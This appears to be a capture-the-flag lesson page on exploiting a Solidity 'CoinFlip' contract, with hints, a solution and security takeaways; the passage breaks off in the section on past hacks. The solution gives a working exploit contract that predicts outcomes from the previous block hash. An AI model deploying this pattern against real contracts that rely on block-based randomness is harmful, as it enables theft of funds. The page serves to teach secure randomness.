In this challenge, you need to exploit the `CoinFlip` contract to predict the outcome of the coin flip 10 times in a row.

## Hints

<Hint index={1}>
    The `CoinFlip` contract uses a random number to determine the outcome of a coin flip. How is this random number
    generated? Look at the code that calculates the outcome.
</Hint>

<Hint index={2}>
    The Solidity `block` object can provide information about the blockchain. How does the contract use `block.number`
    and `blockhash` to determine the coin flip? Are these values predictable?
</Hint>

<Hint index={3}>
    Consider the predictability of `block.number` and `blockhash`. Can you create a contract or a script that calculates
    the result of the coin flip before calling the `flip` function? How can you synchronize with the block in which the
    contract's `flip` function is executed?
</Hint>

## Solution

<Solution>
    The `CoinFlip` contract calculates the outcome of a coin flip using the following formula:

    ```solidity
    uint256 blockValue = uint256(blockhash(block.number - 1));
    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;
    ```

    The value of `blockhash(block.number - 1)` is predictable since it refers to the hash of the previous block. This
    allows you to calculate the result of the coin flip before calling the `flip` function.

    To exploit this, you can create a helper contract that predicts the outcome and then calls the `flip` function with
    the correct guess. Here is a sample contract:

    ```solidity
    pragma solidity ^0.6.0;

    import './CoinFlip.sol';

    contract CoinFlipExploit {
    CoinFlip public coinFlipContract;
    uint256 FACTOR = 1 << 255;

    constructor(address _coinFlipAddress) public {
    coinFlipContract = CoinFlip(_coinFlipAddress);
}

    function predictAndFlip() public {
    uint256 blockValue = uint256(blockhash(block.number - 1));
    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;
    coinFlipContract.flip(side);
}
}
    ```

    Deploy this exploit contract with the address of the `CoinFlip` contract, then repeatedly call the `predictAndFlip`
    function to win the coin flip 10 times in a row.
</Solution>

## Conclusion

<Conclusion>
    <Fragment slot="takeaways">
        This challenge highlights the importance of secure random number generation in smart contracts. Key takeaways
        include:

        1. The `blockhash` and `block.number` values are predictable and should not be used for secure randomness.
        2. Understanding the implications of blockchain determinism and how miners can manipulate block attributes.
        3. Implementing more secure methods for random number generation, such as using oracles or off-chain sources.

        These concepts are crucial for developing secure smart contracts that rely on randomness.

    <Fragment slot="hacks">
        Predictable random number generation has led to several hacks and vulnerabilities in the blockchain space. One
        notable example is the use of predictable values like `blockhash` and `timestamp` to generate "random" numbers,
        which attackers can exploit to their advantage.
